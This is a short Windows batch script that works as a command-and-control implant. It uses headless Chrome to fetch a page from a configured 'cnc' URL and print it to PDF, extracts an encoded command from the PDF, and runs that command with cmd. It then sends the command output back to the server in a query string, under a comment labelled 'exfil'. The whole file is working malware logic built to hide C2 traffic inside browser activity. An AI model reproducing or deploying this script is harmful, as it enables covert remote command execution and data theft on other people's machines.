@echo off
setlocal enabledelayedexpansion

:: config
set cnc=http://localhost:5000/favicon.ico

:: setup
set here=%~dp0
set pdf="!here!out.pdf"

:: get
del !pdf! 2> nul
start chrome --headless --disable-gpu --print-to-pdf=!pdf! !cnc!

:waitexits
timeout /nobreak 1 > nul
if not exist !pdf! goto :waitexits

:: extract
for /f "tokens=2 delims=?)" %%a in ('findstr "http://cmd/?" %pdf%') do (
    set enc_cmd=%%a
)

del !pdf! 2> nul
if [!enc_cmd!] == [] goto :eof

:: decode
set enc_cmd=!enc_cmd:%%20= !

:: run
set lf=%%0D%%0A
for /F "delims=" %%i in ('cmd /c "!enc_cmd!"') DO if ("!out!"=="") (set out=%%i) else (set out=!out!%lf%%%i)

:: exfil
start chrome --headless --disable-gpu !cnc!?r="!out!"
